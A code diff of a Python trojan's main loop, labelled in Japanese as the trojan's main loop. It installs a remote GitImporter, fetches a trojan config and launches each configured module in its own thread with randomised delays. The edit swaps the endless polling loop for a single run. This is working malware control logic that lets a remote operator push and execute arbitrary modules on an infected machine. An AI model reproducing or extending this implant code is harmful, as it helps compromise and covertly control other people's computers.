@@ -119,15 +119,23 @@ def module_runner(module):
 # トロイの木馬のメインループ
 sys.meta_path = [GitImporter()]
 
-while True:
+#while True:
 
-    if task_queue.empty():
+#    if task_queue.empty():
 
-        config = get_trojan_config()
+#        config = get_trojan_config()
 
-        for task in config:
-            t = threading.Thread(target=module_runner,args=(task['module'],))
-            t.start()
-            time.sleep(random.randint(1,10))
+#        for task in config:
+#            t = threading.Thread(target=module_runner,args=(task['module'],))
+#            t.start()
+#            time.sleep(random.randint(1,10))
 
-    time.sleep(random.randint(100,1000))
+#    time.sleep(random.randint(100,1000))
+
+
+config = get_trojan_config()
+
+for task in config:
+	t = threading.Thread(target=module_runner,args=(task['module'],))
+	t.start()
+	time.sleep(random.randint(1,10))
